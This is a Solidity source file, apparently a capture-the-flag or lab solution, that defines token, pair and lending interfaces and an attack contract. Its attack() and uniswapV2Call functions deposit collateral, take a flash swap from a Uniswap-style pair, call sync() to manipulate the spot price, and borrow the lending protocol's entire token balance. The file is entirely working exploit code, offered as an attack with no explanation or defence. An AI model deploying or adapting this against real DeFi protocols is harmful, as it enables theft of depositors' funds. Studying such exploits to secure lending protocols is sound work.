


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    // Returns the total supply of tokens
    function totalSupply() external view returns (uint256);

    // Returns the balance of tokens for the specified address
    function balanceOf(address account) external view returns (uint256);

    // Transfers a specified amount of tokens to a recipient address
    function transfer(address recipient, uint256 amount) external returns (bool);

    // Returns the remaining number of tokens that the spender can spend on behalf of the owner
    function allowance(address owner, address spender) external view returns (uint256);

    // Approves the spender to spend a specified amount of tokens on behalf of the owner
    function approve(address spender, uint256 amount) external returns (bool);

    // Transfers tokens from one address to another, using the allowance mechanism
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    // Emitted when the allowance of a spender is set by a call to approve
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Emitted when a transfer of tokens occurs
    event Transfer(address indexed from, address indexed to, uint256 value);
}


interface IPair {

    // Functions
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
    function getSpotPrice() external view returns (uint256);
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address _token0, address _token1) external;
}

interface ILending {
    function collateralToken() external view returns (IERC20);

    function borrowToken() external view returns (IERC20);

    function pair() external view returns (IPair);

    function usersCollateral(address user) external view returns (uint256);

    function usersUsedCollateral(address user) external view returns (uint256);

    function usersBorrowed(address user) external view returns (uint256);

    function addCollateral(uint256 amount) external;

    function removeCollateral(uint256 amount) external;

    function borrow(uint256 _amount) external;

    function repay(uint256 _amount) external;
}


contract lending {

    IERC20 token0;
    IERC20 token1;
    IPair pair;
    ILending lendingProtocol;

    constructor(address _token0, address _token1, address _pair, address _lendingProtocol) {
       
        token0 = IERC20 (_token0);
        token1 = IERC20(_token1);
        pair = IPair(_pair);
        lendingProtocol = ILending(_lendingProtocol);
    }


    function attack() external {

        token0.transferFrom(msg.sender, address(this), token0.balanceOf(msg.sender));

        //deposit
        uint256 balance0 = token0.balanceOf(address(this));
        token0.approve(address(lendingProtocol), balance0);
        lendingProtocol.addCollateral(balance0);

        //swap to obtain token1
        pair.swap(0, 500e18 - 1, address(this), "0x1");
    }

     function uniswapV2Call(address, uint, uint, bytes calldata) external {

        //sync to adjust the reserves and manipulate the price
        pair.sync();

        //borrow
        lendingProtocol.borrow(token1.balanceOf(address(lendingProtocol)));

        //return to the pair to restore K
        token1.transfer(address(pair), token1.balanceOf(address(this)));

     }

       

       

    
    
}
